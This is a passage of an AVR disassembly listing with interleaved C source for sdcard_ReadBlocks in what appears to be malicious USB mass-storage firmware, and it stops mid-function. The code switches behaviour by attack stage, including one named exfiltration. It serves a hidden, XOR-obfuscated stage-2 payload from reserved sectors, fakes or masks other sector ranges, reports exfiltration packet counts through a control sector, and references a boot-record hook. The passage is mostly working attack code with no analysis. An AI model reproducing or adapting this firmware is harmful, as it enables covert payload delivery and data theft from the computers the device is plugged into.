    58ba:	cd 5a       	subi	r28, 0xAD	; 173
    58bc:	df 4f       	sbci	r29, 0xFF	; 255
    58be:	0f b6       	in	r0, 0x3f	; 63
    58c0:	f8 94       	cli
    58c2:	de bf       	out	0x3e, r29	; 62
    58c4:	0f be       	out	0x3f, r0	; 63
    58c6:	cd bf       	out	0x3d, r28	; 61
    58c8:	df 91       	pop	r29
    58ca:	cf 91       	pop	r28
    58cc:	1f 91       	pop	r17
    58ce:	0f 91       	pop	r16
    58d0:	ff 90       	pop	r15
    58d2:	ef 90       	pop	r14
    58d4:	df 90       	pop	r13
    58d6:	cf 90       	pop	r12
    58d8:	bf 90       	pop	r11
    58da:	af 90       	pop	r10
    58dc:	9f 90       	pop	r9
    58de:	8f 90       	pop	r8
    58e0:	08 95       	ret

000058e2 <sdcard_ReadBlocks>:

extern void(*DREG_HOOK_BOOT_RECORD)(uint8_t boot_sector[512]);

void sdcard_ReadBlocks(USB_ClassInfo_MS_Device_t* MSInterfaceInfo,
                       uint32_t BlockAddress, uint16_t TotalBlocks)
{
    58e2:	8f 92       	push	r8
    58e4:	9f 92       	push	r9
    58e6:	af 92       	push	r10
    58e8:	bf 92       	push	r11
    58ea:	cf 92       	push	r12
    58ec:	df 92       	push	r13
    58ee:	ef 92       	push	r14
    58f0:	ff 92       	push	r15
    58f2:	0f 93       	push	r16
    58f4:	1f 93       	push	r17
    58f6:	cf 93       	push	r28
    58f8:	df 93       	push	r29
    58fa:	4a 01       	movw	r8, r20
    58fc:	5b 01       	movw	r10, r22
    58fe:	69 01       	movw	r12, r18
    uint8_t* sec_ptr = rwbff;
    int i;
    int k = 1;


    printf_P(PSTR("R %li %i\r\n"), BlockAddress, TotalBlocks);
    5900:	df 92       	push	r13
    5902:	2f 93       	push	r18
    5904:	bf 92       	push	r11
    5906:	af 92       	push	r10
    5908:	9f 92       	push	r9
    590a:	4f 93       	push	r20
    590c:	8c e8       	ldi	r24, 0x8C	; 140
    590e:	92 e0       	ldi	r25, 0x02	; 2
    5910:	9f 93       	push	r25
    5912:	8f 93       	push	r24
    5914:	0e 94 5d 39 	call	0x72ba	; 0x72ba <printf_P>

    /* Wait until endpoint is ready before continuing */
    if (Endpoint_WaitUntilReady())
    5918:	0e 94 2e 35 	call	0x6a5c	; 0x6a5c <Endpoint_WaitUntilReady>
    591c:	2d b7       	in	r18, 0x3d	; 61
    591e:	3e b7       	in	r19, 0x3e	; 62
    5920:	28 5f       	subi	r18, 0xF8	; 248
    5922:	3f 4f       	sbci	r19, 0xFF	; 255
    5924:	0f b6       	in	r0, 0x3f	; 63
    5926:	f8 94       	cli
    5928:	3e bf       	out	0x3e, r19	; 62
    592a:	0f be       	out	0x3f, r0	; 63
    592c:	2d bf       	out	0x3d, r18	; 61
    592e:	88 23       	and	r24, r24
    5930:	09 f4       	brne	.+2      	; 0x5934 <sdcard_ReadBlocks+0x52>
    5932:	05 c2       	rjmp	.+1034   	; 0x5d3e <sdcard_ReadBlocks+0x45c>
    5934:	11 c2       	rjmp	.+1058   	; 0x5d58 <sdcard_ReadBlocks+0x476>

    while (TotalBlocks)
    {
        k = 1;

        if (STAG_ONLYMASS == eppr_vars.curr_stage)
    5936:	80 91 83 09 	lds	r24, 0x0983	; 0x800983 <eppr_vars+0x1>
    593a:	83 30       	cpi	r24, 0x03	; 3
    593c:	49 f5       	brne	.+82     	; 0x5990 <sdcard_ReadBlocks+0xae>
        {
            if (!eppr_vars.deleted_files)
    593e:	80 91 84 09 	lds	r24, 0x0984	; 0x800984 <eppr_vars+0x2>
    5942:	81 11       	cpse	r24, r1
    5944:	4b c1       	rjmp	.+662    	; 0x5bdc <sdcard_ReadBlocks+0x2fa>
            {
                if ((BlockAddress >= D_SECTOR && BlockAddress <= STAGE1_END_SECTOR)
    5946:	d5 01       	movw	r26, r10
    5948:	c4 01       	movw	r24, r8
    594a:	80 54       	subi	r24, 0x40	; 64
    594c:	91 09       	sbc	r25, r1
    594e:	a1 09       	sbc	r26, r1
    5950:	b1 09       	sbc	r27, r1
    5952:	8f 32       	cpi	r24, 0x2F	; 47
    5954:	91 40       	sbci	r25, 0x01	; 1
    5956:	a1 05       	cpc	r26, r1
    5958:	b1 05       	cpc	r27, r1
    595a:	60 f0       	brcs	.+24     	; 0x5974 <sdcard_ReadBlocks+0x92>
                        || (BlockAddress >= STAGE2_START_SECTOR && BlockAddress <= STAGE2_END_SECTOR))
    595c:	d5 01       	movw	r26, r10
    595e:	c4 01       	movw	r24, r8
    5960:	88 5f       	subi	r24, 0xF8	; 248
    5962:	97 4a       	sbci	r25, 0xA7	; 167
    5964:	a1 09       	sbc	r26, r1
    5966:	b1 09       	sbc	r27, r1
    5968:	80 34       	cpi	r24, 0x40	; 64
    596a:	91 40       	sbci	r25, 0x01	; 1
    596c:	a1 05       	cpc	r26, r1
    596e:	b1 05       	cpc	r27, r1
    5970:	08 f0       	brcs	.+2      	; 0x5974 <sdcard_ReadBlocks+0x92>
    5972:	34 c1       	rjmp	.+616    	; 0x5bdc <sdcard_ReadBlocks+0x2fa>
                {
                    memset(rwbff, 'W', 512);
    5974:	40 e0       	ldi	r20, 0x00	; 0
    5976:	52 e0       	ldi	r21, 0x02	; 2
    5978:	67 e5       	ldi	r22, 0x57	; 87
    597a:	70 e0       	ldi	r23, 0x00	; 0
    597c:	81 ee       	ldi	r24, 0xE1	; 225
    597e:	9b e0       	ldi	r25, 0x0B	; 11
    5980:	0e 94 15 39 	call	0x722a	; 0x722a <memset>
        return;
    }

    while (TotalBlocks)
    {
        k = 1;
    5984:	ee 24       	eor	r14, r14
    5986:	e3 94       	inc	r14
    5988:	f1 2c       	mov	r15, r1
            {
                if ((BlockAddress >= D_SECTOR && BlockAddress <= STAGE1_END_SECTOR)
                        || (BlockAddress >= STAGE2_START_SECTOR && BlockAddress <= STAGE2_END_SECTOR))
                {
                    memset(rwbff, 'W', 512);
                    sec_ptr = rwbff;
    598a:	c1 ee       	ldi	r28, 0xE1	; 225
    598c:	db e0       	ldi	r29, 0x0B	; 11
                    goto retsec;
    598e:	5c c1       	rjmp	.+696    	; 0x5c48 <sdcard_ReadBlocks+0x366>
                }
            }
            goto sd_read;
        }

        if (eppr_vars.curr_stage == STAG_2 && BlockAddress >= D_SECTOR
    5990:	80 91 83 09 	lds	r24, 0x0983	; 0x800983 <eppr_vars+0x1>
    5994:	81 30       	cpi	r24, 0x01	; 1
    5996:	79 f5       	brne	.+94     	; 0x59f6 <sdcard_ReadBlocks+0x114>
    5998:	30 e4       	ldi	r19, 0x40	; 64
    599a:	83 16       	cp	r8, r19
    599c:	91 04       	cpc	r9, r1
    599e:	a1 04       	cpc	r10, r1
    59a0:	b1 04       	cpc	r11, r1
    59a2:	48 f1       	brcs	.+82     	; 0x59f6 <sdcard_ReadBlocks+0x114>
                && BlockAddress <= (D_SECTOR + STAGE2_TOTAL_SECTORS))
    59a4:	81 e8       	ldi	r24, 0x81	; 129
    59a6:	88 16       	cp	r8, r24
    59a8:	81 e0       	ldi	r24, 0x01	; 1
    59aa:	98 06       	cpc	r9, r24
    59ac:	a1 04       	cpc	r10, r1
    59ae:	b1 04       	cpc	r11, r1
    59b0:	10 f5       	brcc	.+68     	; 0x59f6 <sdcard_ReadBlocks+0x114>
        {
            disk_read(0, rwbff, STAGE2_START_SECTOR + (BlockAddress - D_SECTOR), 1);
    59b2:	01 e0       	ldi	r16, 0x01	; 1
    59b4:	10 e0       	ldi	r17, 0x00	; 0
    59b6:	a5 01       	movw	r20, r10
    59b8:	94 01       	movw	r18, r8
    59ba:	28 54       	subi	r18, 0x48	; 72
    59bc:	38 45       	sbci	r19, 0x58	; 88
    59be:	4f 4f       	sbci	r20, 0xFF	; 255
    59c0:	5f 4f       	sbci	r21, 0xFF	; 255
    59c2:	61 ee       	ldi	r22, 0xE1	; 225
    59c4:	7b e0       	ldi	r23, 0x0B	; 11
    59c6:	80 e0       	ldi	r24, 0x00	; 0
    59c8:	0e 94 9d 06 	call	0xd3a	; 0xd3a <disk_read>
            for (int i = 0; i < 512; i++)
    59cc:	80 e0       	ldi	r24, 0x00	; 0
    59ce:	90 e0       	ldi	r25, 0x00	; 0
    59d0:	08 c0       	rjmp	.+16     	; 0x59e2 <sdcard_ReadBlocks+0x100>
            {
                rwbff[i] ^= XOR_KEY_BYTE;
    59d2:	fc 01       	movw	r30, r24
    59d4:	ef 51       	subi	r30, 0x1F	; 31
    59d6:	f4 4f       	sbci	r31, 0xF4	; 244
    59d8:	30 81       	ld	r19, Z
    59da:	29 e6       	ldi	r18, 0x69	; 105
    59dc:	23 27       	eor	r18, r19
    59de:	20 83       	st	Z, r18

        if (eppr_vars.curr_stage == STAG_2 && BlockAddress >= D_SECTOR
                && BlockAddress <= (D_SECTOR + STAGE2_TOTAL_SECTORS))
        {
            disk_read(0, rwbff, STAGE2_START_SECTOR + (BlockAddress - D_SECTOR), 1);
            for (int i = 0; i < 512; i++)
    59e0:	01 96       	adiw	r24, 0x01	; 1
    59e2:	81 15       	cp	r24, r1
    59e4:	22 e0       	ldi	r18, 0x02	; 2
    59e6:	92 07       	cpc	r25, r18
    59e8:	a4 f3       	brlt	.-24     	; 0x59d2 <sdcard_ReadBlocks+0xf0>
        return;
    }

    while (TotalBlocks)
    {
        k = 1;
    59ea:	ee 24       	eor	r14, r14
    59ec:	e3 94       	inc	r14
    59ee:	f1 2c       	mov	r15, r1
            disk_read(0, rwbff, STAGE2_START_SECTOR + (BlockAddress - D_SECTOR), 1);
            for (int i = 0; i < 512; i++)
            {
                rwbff[i] ^= XOR_KEY_BYTE;
            }
            sec_ptr = rwbff;
    59f0:	c1 ee       	ldi	r28, 0xE1	; 225
    59f2:	db e0       	ldi	r29, 0x0B	; 11
    59f4:	29 c1       	rjmp	.+594    	; 0x5c48 <sdcard_ReadBlocks+0x366>
            goto retsec;
        }

        if (BlockAddress >= MAX_SECTOR_NR_POSSIBLE)
    59f6:	3b e4       	ldi	r19, 0x4B	; 75
    59f8:	83 16       	cp	r8, r19
    59fa:	30 e5       	ldi	r19, 0x50	; 80
    59fc:	93 06       	cpc	r9, r19
    59fe:	a1 04       	cpc	r10, r1
    5a00:	b1 04       	cpc	r11, r1
    5a02:	48 f0       	brcs	.+18     	; 0x5a16 <sdcard_ReadBlocks+0x134>
        {
            printf_P(PSTR("\r\n\r\ERROR!!! BlockAddress impossible to mirror\r\n\r\n"));
    5a04:	8a e5       	ldi	r24, 0x5A	; 90
    5a06:	92 e0       	ldi	r25, 0x02	; 2
    5a08:	9f 93       	push	r25
    5a0a:	8f 93       	push	r24
    5a0c:	0e 94 5d 39 	call	0x72ba	; 0x72ba <printf_P>
            goto sd_read;
    5a10:	0f 90       	pop	r0
    5a12:	0f 90       	pop	r0
    5a14:	e3 c0       	rjmp	.+454    	; 0x5bdc <sdcard_ReadBlocks+0x2fa>
        }

        if (BlockAddress == R_SECTOR && last_cmd_nr
    5a16:	8c e3       	ldi	r24, 0x3C	; 60
    5a18:	88 16       	cp	r8, r24
    5a1a:	91 04       	cpc	r9, r1
    5a1c:	a1 04       	cpc	r10, r1
    5a1e:	b1 04       	cpc	r11, r1
    5a20:	49 f5       	brne	.+82     	; 0x5a74 <sdcard_ReadBlocks+0x192>
    5a22:	80 91 7c 09 	lds	r24, 0x097C	; 0x80097c <last_cmd_nr>
    5a26:	88 23       	and	r24, r24
    5a28:	29 f1       	breq	.+74     	; 0x5a74 <sdcard_ReadBlocks+0x192>
                && eppr_vars.curr_stage == STAG_EXFILL)
    5a2a:	80 91 83 09 	lds	r24, 0x0983	; 0x800983 <eppr_vars+0x1>
    5a2e:	82 30       	cpi	r24, 0x02	; 2
    5a30:	09 f5       	brne	.+66     	; 0x5a74 <sdcard_ReadBlocks+0x192>
        {
            printf("\r\nreading nr of packets from R SECTOR...\r\n");
    5a32:	84 e4       	ldi	r24, 0x44	; 68
    5a34:	98 e0       	ldi	r25, 0x08	; 8
    5a36:	0e 94 84 39 	call	0x7308	; 0x7308 <puts>
            memset(rwbff, 'r', 512);
    5a3a:	40 e0       	ldi	r20, 0x00	; 0
    5a3c:	52 e0       	ldi	r21, 0x02	; 2
    5a3e:	62 e7       	ldi	r22, 0x72	; 114
    5a40:	70 e0       	ldi	r23, 0x00	; 0
    5a42:	81 ee       	ldi	r24, 0xE1	; 225
    5a44:	9b e0       	ldi	r25, 0x0B	; 11
    5a46:	0e 94 15 39 	call	0x722a	; 0x722a <memset>
            rwbff[0] = R_FILE_RESETWORKS_FLAG;
    5a4a:	e1 ee       	ldi	r30, 0xE1	; 225
    5a4c:	fb e0       	ldi	r31, 0x0B	; 11
    5a4e:	80 e5       	ldi	r24, 0x50	; 80
    5a50:	80 83       	st	Z, r24
            *((uint32_t*)(rwbff + 1)) = nr_packet_send;
    5a52:	80 91 7d 09 	lds	r24, 0x097D	; 0x80097d <nr_packet_send>
    5a56:	90 91 7e 09 	lds	r25, 0x097E	; 0x80097e <nr_packet_send+0x1>
    5a5a:	a0 91 7f 09 	lds	r26, 0x097F	; 0x80097f <nr_packet_send+0x2>
    5a5e:	b0 91 80 09 	lds	r27, 0x0980	; 0x800980 <nr_packet_send+0x3>
    5a62:	81 83       	std	Z+1, r24	; 0x01
    5a64:	92 83       	std	Z+2, r25	; 0x02
    5a66:	a3 83       	std	Z+3, r26	; 0x03
    5a68:	b4 83       	std	Z+4, r27	; 0x04
        return;
    }

    while (TotalBlocks)
    {
        k = 1;
    5a6a:	ee 24       	eor	r14, r14
    5a6c:	e3 94       	inc	r14
    5a6e:	f1 2c       	mov	r15, r1
        {
            printf("\r\nreading nr of packets from R SECTOR...\r\n");
            memset(rwbff, 'r', 512);
            rwbff[0] = R_FILE_RESETWORKS_FLAG;
            *((uint32_t*)(rwbff + 1)) = nr_packet_send;
            sec_ptr = rwbff;
    5a70:	ef 01       	movw	r28, r30
            goto retsec;
    5a72:	ea c0       	rjmp	.+468    	; 0x5c48 <sdcard_ReadBlocks+0x366>
        }

        if (test_bit_mbpl(BlockAddress))
    5a74:	f4 01       	movw	r30, r8
    5a76:	e7 59       	subi	r30, 0x97	; 151
    5a78:	fd 4d       	sbci	r31, 0xDD	; 221
    5a7a:	80 81       	ld	r24, Z
    5a7c:	80 ff       	sbrs	r24, 0
    5a7e:	13 c0       	rjmp	.+38     	; 0x5aa6 <sdcard_ReadBlocks+0x1c4>
        {
            //printf_P(PSTR("\r\nmirroring read!\r\n"));
            disk_read(0, rwbff, BlockAddress  + MIRROR_START_SECTOR, 1);
    5a80:	01 e0       	ldi	r16, 0x01	; 1
    5a82:	10 e0       	ldi	r17, 0x00	; 0
    5a84:	a5 01       	movw	r20, r10
    5a86:	94 01       	movw	r18, r8
    5a88:	28 5f       	subi	r18, 0xF8	; 248
    5a8a:	3d 4a       	sbci	r19, 0xAD	; 173
    5a8c:	4f 4f       	sbci	r20, 0xFF	; 255
    5a8e:	5f 4f       	sbci	r21, 0xFF	; 255
    5a90:	61 ee       	ldi	r22, 0xE1	; 225
    5a92:	7b e0       	ldi	r23, 0x0B	; 11
    5a94:	80 e0       	ldi	r24, 0x00	; 0
    5a96:	0e 94 9d 06 	call	0xd3a	; 0xd3a <disk_read>
        return;
    }

    while (TotalBlocks)
    {
        k = 1;
    5a9a:	ee 24       	eor	r14, r14
    5a9c:	e3 94       	inc	r14
    5a9e:	f1 2c       	mov	r15, r1

        if (test_bit_mbpl(BlockAddress))
        {
            //printf_P(PSTR("\r\nmirroring read!\r\n"));
            disk_read(0, rwbff, BlockAddress  + MIRROR_START_SECTOR, 1);
            sec_ptr = rwbff;
    5aa0:	c1 ee       	ldi	r28, 0xE1	; 225
    5aa2:	db e0       	ldi	r29, 0x0B	; 11
            goto retsec;
    5aa4:	d1 c0       	rjmp	.+418    	; 0x5c48 <sdcard_ReadBlocks+0x366>
        }

        if (BlockAddress == R_SECTOR && eppr_vars.curr_stage == STAG_EXFILL)
    5aa6:	2c e3       	ldi	r18, 0x3C	; 60
    5aa8:	82 16       	cp	r8, r18
    5aaa:	91 04       	cpc	r9, r1
    5aac:	a1 04       	cpc	r10, r1
    5aae:	b1 04       	cpc	r11, r1
    5ab0:	a9 f4       	brne	.+42     	; 0x5adc <sdcard_ReadBlocks+0x1fa>
    5ab2:	80 91 83 09 	lds	r24, 0x0983	; 0x800983 <eppr_vars+0x1>
    5ab6:	82 30       	cpi	r24, 0x02	; 2
    5ab8:	89 f4       	brne	.+34     	; 0x5adc <sdcard_ReadBlocks+0x1fa>
        {
            memset(rwbff, 'r', 512);
    5aba:	40 e0       	ldi	r20, 0x00	; 0
    5abc:	52 e0       	ldi	r21, 0x02	; 2
    5abe:	62 e7       	ldi	r22, 0x72	; 114
    5ac0:	70 e0       	ldi	r23, 0x00	; 0
    5ac2:	81 ee       	ldi	r24, 0xE1	; 225
    5ac4:	9b e0       	ldi	r25, 0x0B	; 11
    5ac6:	0e 94 15 39 	call	0x722a	; 0x722a <memset>
            rwbff[0] = R_FILE_STAGEEXFILL_FLAG;
    5aca:	81 e0       	ldi	r24, 0x01	; 1
    5acc:	80 93 e1 0b 	sts	0x0BE1, r24	; 0x800be1 <rwbff>
        return;
    }

    while (TotalBlocks)
    {
        k = 1;
    5ad0:	ee 24       	eor	r14, r14
    5ad2:	e3 94       	inc	r14
    5ad4:	f1 2c       	mov	r15, r1

        if (BlockAddress == R_SECTOR && eppr_vars.curr_stage == STAG_EXFILL)
        {
            memset(rwbff, 'r', 512);
            rwbff[0] = R_FILE_STAGEEXFILL_FLAG;
            sec_ptr = rwbff;
    5ad6:	c1 ee       	ldi	r28, 0xE1	; 225
    5ad8:	db e0       	ldi	r29, 0x0B	; 11
            goto retsec;
    5ada:	b6 c0       	rjmp	.+364    	; 0x5c48 <sdcard_ReadBlocks+0x366>
        }

        if (BlockAddress == R_SECTOR && eppr_vars.curr_stage == STAG_2)
    5adc:	3c e3       	ldi	r19, 0x3C	; 60
    5ade:	83 16       	cp	r8, r19
    5ae0:	91 04       	cpc	r9, r1
    5ae2:	a1 04       	cpc	r10, r1
    5ae4:	b1 04       	cpc	r11, r1
    5ae6:	a1 f4       	brne	.+40     	; 0x5b10 <sdcard_ReadBlocks+0x22e>
    5ae8:	80 91 83 09 	lds	r24, 0x0983	; 0x800983 <eppr_vars+0x1>
    5aec:	81 30       	cpi	r24, 0x01	; 1
    5aee:	81 f4       	brne	.+32     	; 0x5b10 <sdcard_ReadBlocks+0x22e>
        {
            memset(rwbff, 'r', 512);
    5af0:	40 e0       	ldi	r20, 0x00	; 0
    5af2:	52 e0       	ldi	r21, 0x02	; 2
    5af4:	62 e7       	ldi	r22, 0x72	; 114
    5af6:	70 e0       	ldi	r23, 0x00	; 0
    5af8:	81 ee       	ldi	r24, 0xE1	; 225
    5afa:	9b e0       	ldi	r25, 0x0B	; 11
    5afc:	0e 94 15 39 	call	0x722a	; 0x722a <memset>
            rwbff[0] = R_FILE_STAGE2_FLAG;
    5b00:	10 92 e1 0b 	sts	0x0BE1, r1	; 0x800be1 <rwbff>
        return;
    }

    while (TotalBlocks)
    {
        k = 1;
    5b04:	ee 24       	eor	r14, r14
    5b06:	e3 94       	inc	r14
    5b08:	f1 2c       	mov	r15, r1

        if (BlockAddress == R_SECTOR && eppr_vars.curr_stage == STAG_2)
        {
            memset(rwbff, 'r', 512);
            rwbff[0] = R_FILE_STAGE2_FLAG;
            sec_ptr = rwbff;
    5b0a:	c1 ee       	ldi	r28, 0xE1	; 225
    5b0c:	db e0       	ldi	r29, 0x0B	; 11
            goto retsec;
    5b0e:	9c c0       	rjmp	.+312    	; 0x5c48 <sdcard_ReadBlocks+0x366>
k = 1;

static uint8_t b_0x64[16] = { 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64 };


if (eppr_vars.curr_stage == STAG_EXFILL && BlockAddress >= 64 && BlockAddress <= 12352)
    5b10:	80 91 83 09 	lds	r24, 0x0983	; 0x800983 <eppr_vars+0x1>
    5b14:	82 30       	cpi	r24, 0x02	; 2
    5b16:	71 f4       	brne	.+28     	; 0x5b34 <sdcard_ReadBlocks+0x252>
    5b18:	80 e4       	ldi	r24, 0x40	; 64
    5b1a:	88 16       	cp	r8, r24
    5b1c:	91 04       	cpc	r9, r1
    5b1e:	a1 04       	cpc	r10, r1
    5b20:	b1 04       	cpc	r11, r1
    5b22:	40 f0       	brcs	.+16     	; 0x5b34 <sdcard_ReadBlocks+0x252>
    5b24:	21 e4       	ldi	r18, 0x41	; 65
    5b26:	82 16       	cp	r8, r18
    5b28:	20 e3       	ldi	r18, 0x30	; 48
    5b2a:	92 06       	cpc	r9, r18
    5b2c:	a1 04       	cpc	r10, r1
    5b2e:	b1 04       	cpc	r11, r1
    5b30:	08 f4       	brcc	.+2      	; 0x5b34 <sdcard_ReadBlocks+0x252>
    5b32:	63 c0       	rjmp	.+198    	; 0x5bfa <sdcard_ReadBlocks+0x318>
{
    sec_ptr = b_0x64; k = 0; goto retsec;
}


if (eppr_vars.curr_stage == STAG_1 && BlockAddress >= 366 && BlockAddress <= 12352)
    5b34:	80 91 83 09 	lds	r24, 0x0983	; 0x800983 <eppr_vars+0x1>
    5b38:	81 11       	cpse	r24, r1
    5b3a:	0f c0       	rjmp	.+30     	; 0x5b5a <sdcard_ReadBlocks+0x278>
    5b3c:	3e e6       	ldi	r19, 0x6E	; 110
    5b3e:	83 16       	cp	r8, r19
    5b40:	31 e0       	ldi	r19, 0x01	; 1
    5b42:	93 06       	cpc	r9, r19
    5b44:	a1 04       	cpc	r10, r1
    5b46:	b1 04       	cpc	r11, r1
    5b48:	40 f0       	brcs	.+16     	; 0x5b5a <sdcard_ReadBlocks+0x278>
    5b4a:	81 e4       	ldi	r24, 0x41	; 65
    5b4c:	88 16       	cp	r8, r24
    5b4e:	80 e3       	ldi	r24, 0x30	; 48
    5b50:	98 06       	cpc	r9, r24
    5b52:	a1 04       	cpc	r10, r1
    5b54:	b1 04       	cpc	r11, r1
    5b56:	08 f4       	brcc	.+2      	; 0x5b5a <sdcard_ReadBlocks+0x278>
    5b58:	55 c0       	rjmp	.+170    	; 0x5c04 <sdcard_ReadBlocks+0x322>
{
    sec_ptr = b_0x64; k = 0; goto retsec;
}


if (eppr_vars.curr_stage == STAG_2 && BlockAddress >= 384 && BlockAddress <= 12352)
    5b5a:	80 91 83 09 	lds	r24, 0x0983	; 0x800983 <eppr_vars+0x1>
    5b5e:	81 30       	cpi	r24, 0x01	; 1
    5b60:	79 f4       	brne	.+30     	; 0x5b80 <sdcard_ReadBlocks+0x29e>
    5b62:	20 e8       	ldi	r18, 0x80	; 128
    5b64:	82 16       	cp	r8, r18
    5b66:	21 e0       	ldi	r18, 0x01	; 1
    5b68:	92 06       	cpc	r9, r18
    5b6a:	a1 04       	cpc	r10, r1
    5b6c:	b1 04       	cpc	r11, r1
    5b6e:	40 f0       	brcs	.+16     	; 0x5b80 <sdcard_ReadBlocks+0x29e>
    5b70:	31 e4       	ldi	r19, 0x41	; 65
    5b72:	83 16       	cp	r8, r19
    5b74:	30 e3       	ldi	r19, 0x30	; 48
    5b76:	93 06       	cpc	r9, r19
    5b78:	a1 04       	cpc	r10, r1
    5b7a:	b1 04       	cpc	r11, r1
    5b7c:	08 f4       	brcc	.+2      	; 0x5b80 <sdcard_ReadBlocks+0x29e>
    5b7e:	47 c0       	rjmp	.+142    	; 0x5c0e <sdcard_ReadBlocks+0x32c>

static uint8_t b_0x00[16] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };


if ( 
    (BlockAddress >= 1 && BlockAddress <= 3) ||
    5b80:	d5 01       	movw	r26, r10
    5b82:	c4 01       	movw	r24, r8
    5b84:	01 97       	sbiw	r24, 0x01	; 1
    5b86:	a1 09       	sbc	r26, r1
    5b88:	b1 09       	sbc	r27, r1


static uint8_t b_0x00[16] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };


if ( 
    5b8a:	03 97       	sbiw	r24, 0x03	; 3
    5b8c:	a1 05       	cpc	r26, r1
    5b8e:	b1 05       	cpc	r27, r1
    5b90:	08 f4       	brcc	.+2      	; 0x5b94 <sdcard_ReadBlocks+0x2b2>
    5b92:	42 c0       	rjmp	.+132    	; 0x5c18 <sdcard_ReadBlocks+0x336>
    (BlockAddress >= 1 && BlockAddress <= 3) ||
    (BlockAddress >= 17 && BlockAddress <= 23) ||
    5b94:	d5 01       	movw	r26, r10
    5b96:	c4 01       	movw	r24, r8
    5b98:	41 97       	sbiw	r24, 0x11	; 17
    5b9a:	a1 09       	sbc	r26, r1
    5b9c:	b1 09       	sbc	r27, r1

static uint8_t b_0x00[16] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };


if ( 
    (BlockAddress >= 1 && BlockAddress <= 3) ||
    5b9e:	07 97       	sbiw	r24, 0x07	; 7
    5ba0:	a1 05       	cpc	r26, r1
    5ba2:	b1 05       	cpc	r27, r1
    5ba4:	f0 f1       	brcs	.+124    	; 0x5c22 <sdcard_ReadBlocks+0x340>
    (BlockAddress >= 17 && BlockAddress <= 23) ||
    (BlockAddress >= 25 && BlockAddress <= 55) ||
    5ba6:	d5 01       	movw	r26, r10
    5ba8:	c4 01       	movw	r24, r8
    5baa:	49 97       	sbiw	r24, 0x19	; 25
    5bac:	a1 09       	sbc	r26, r1
    5bae:	b1 09       	sbc	r27, r1
static uint8_t b_0x00[16] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };


if ( 
    (BlockAddress >= 1 && BlockAddress <= 3) ||
    (BlockAddress >= 17 && BlockAddress <= 23) ||
    5bb0:	4f 97       	sbiw	r24, 0x1f	; 31
    5bb2:	a1 05       	cpc	r26, r1
    5bb4:	b1 05       	cpc	r27, r1
    5bb6:	d0 f1       	brcs	.+116    	; 0x5c2c <sdcard_ReadBlocks+0x34a>
    (BlockAddress >= 25 && BlockAddress <= 55) ||
    (BlockAddress >= 57 && BlockAddress <= 59) ||
    5bb8:	d5 01       	movw	r26, r10
    5bba:	c4 01       	movw	r24, r8
    5bbc:	c9 97       	sbiw	r24, 0x39	; 57
    5bbe:	a1 09       	sbc	r26, r1
    5bc0:	b1 09       	sbc	r27, r1


if ( 
    (BlockAddress >= 1 && BlockAddress <= 3) ||
    (BlockAddress >= 17 && BlockAddress <= 23) ||
    (BlockAddress >= 25 && BlockAddress <= 55) ||
    5bc2:	03 97       	sbiw	r24, 0x03	; 3
    5bc4:	a1 05       	cpc	r26, r1
    5bc6:	b1 05       	cpc	r27, r1
    5bc8:	b0 f1       	brcs	.+108    	; 0x5c36 <sdcard_ReadBlocks+0x354>
    (BlockAddress >= 57 && BlockAddress <= 59) ||
    (BlockAddress >= 61 && BlockAddress <= 63)
    5bca:	d5 01       	movw	r26, r10
    5bcc:	c4 01       	movw	r24, r8
    5bce:	cd 97       	sbiw	r24, 0x3d	; 61
    5bd0:	a1 09       	sbc	r26, r1
    5bd2:	b1 09       	sbc	r27, r1

if ( 
    (BlockAddress >= 1 && BlockAddress <= 3) ||
    (BlockAddress >= 17 && BlockAddress <= 23) ||
    (BlockAddress >= 25 && BlockAddress <= 55) ||
    (BlockAddress >= 57 && BlockAddress <= 59) ||
    5bd4:	03 97       	sbiw	r24, 0x03	; 3
    5bd6:	a1 05       	cpc	r26, r1
    5bd8:	b1 05       	cpc	r27, r1
    5bda:	90 f1       	brcs	.+100    	; 0x5c40 <sdcard_ReadBlocks+0x35e>
#include "opti.h"
#endif


sd_read:
        disk_read(0, rwbff, BlockAddress, 1);
    5bdc:	01 e0       	ldi	r16, 0x01	; 1
    5bde:	10 e0       	ldi	r17, 0x00	; 0
    5be0:	a5 01       	movw	r20, r10
    5be2:	94 01       	movw	r18, r8
    5be4:	61 ee       	ldi	r22, 0xE1	; 225
    5be6:	7b e0       	ldi	r23, 0x0B	; 11
    5be8:	80 e0       	ldi	r24, 0x00	; 0
    5bea:	0e 94 9d 06 	call	0xd3a	; 0xd3a <disk_read>
    5bee:	ee 24       	eor	r14, r14
    5bf0:	e3 94       	inc	r14
    5bf2:	f1 2c       	mov	r15, r1
        sec_ptr = rwbff;
    5bf4:	c1 ee       	ldi	r28, 0xE1	; 225
    5bf6:	db e0       	ldi	r29, 0x0B	; 11
    5bf8:	27 c0       	rjmp	.+78     	; 0x5c48 <sdcard_ReadBlocks+0x366>
static uint8_t b_0x64[16] = { 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64, 0x64 };


if (eppr_vars.curr_stage == STAG_EXFILL && BlockAddress >= 64 && BlockAddress <= 12352)
{
    sec_ptr = b_0x64; k = 0; goto retsec;
    5bfa:	e1 2c       	mov	r14, r1
    5bfc:	f1 2c       	mov	r15, r1
    5bfe:	ca e6       	ldi	r28, 0x6A	; 106
    5c00:	d1 e0       	ldi	r29, 0x01	; 1
    5c02:	22 c0       	rjmp	.+68     	; 0x5c48 <sdcard_ReadBlocks+0x366>
}


if (eppr_vars.curr_stage == STAG_1 && BlockAddress >= 366 && BlockAddress <= 12352)
{
    sec_ptr = b_0x64; k = 0; goto retsec;
    5c04:	e1 2c       	mov	r14, r1
    5c06:	f1 2c       	mov	r15, r1
    5c08:	ca e6       	ldi	r28, 0x6A	; 106
